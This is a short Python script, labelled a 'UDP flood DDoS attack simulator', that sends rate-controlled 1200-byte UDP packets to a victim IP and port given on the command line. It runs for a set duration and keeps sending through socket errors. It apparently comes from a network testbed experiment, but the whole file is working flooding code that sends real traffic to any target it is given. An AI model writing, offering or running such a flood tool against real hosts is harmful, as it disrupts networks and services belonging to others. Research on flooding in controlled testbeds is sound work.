#!/usr/bin/env python3
"""
UDP flood DDoS attack simulator.
Sends high-volume UDP traffic to a victim IP at specified bitrate.
"""

import socket
import sys
import time


def parse_args():
    if len(sys.argv) < 3:
        print("Usage: ddos_flood.py VICTIM_IP VICTIM_PORT [BANDWIDTH] [START_TIME] [DURATION]", file=sys.stderr)
        return None

    victim_ip = sys.argv[1]
    victim_port = int(sys.argv[2])
    bandwidth = sys.argv[3] if len(sys.argv) > 3 else "50M"
    start_time = int(sys.argv[4]) if len(sys.argv) > 4 else 0
    duration = int(sys.argv[5]) if len(sys.argv) > 5 else 600

    return victim_ip, victim_port, bandwidth, start_time, duration


def parse_kbit_rate(rate: str) -> int:
    """Parse bandwidth string (e.g., '50M', '50000K') to bits per second"""
    value = rate.strip().lower()
    if value.endswith("k"):
        return int(float(value[:-1]) * 1000)
    if value.endswith("m"):
        return int(float(value[:-1]) * 1000 * 1000)
    return int(float(value))


def main() -> int:
    args = parse_args()
    if args is None:
        return 1

    victim_ip, victim_port, bandwidth, start_time, duration = args
    
    # Convert bandwidth to bits per second, then to bytes per second
    rate_bps = parse_kbit_rate(bandwidth)
    bytes_per_sec = rate_bps / 8.0
    
    # Use 1200 byte payload (similar to camera UDP stream)
    payload_size = 1200
    payload = b"ATTACK" + b"X" * (payload_size - 6)
    
    # Calculate packets per second needed to reach target bandwidth
    target_pps = max(1, int(bytes_per_sec / payload_size))
    interval = 1.0 / target_pps if target_pps > 0 else 0.001
    
    script_start = time.time()
    
    # Wait until start_time
    while time.time() - script_start < start_time:
        time.sleep(0.01)
    
    # Begin sending UDP flood
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    flood_start = time.time()
    packet_count = 0
    
    try:
        while time.time() - flood_start < duration:
            try:
                sock.sendto(payload, (victim_ip, victim_port))
                packet_count += 1
                time.sleep(interval)
            except Exception:
                # Continue sending even if there are socket errors
                pass
    finally:
        sock.close()
    
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
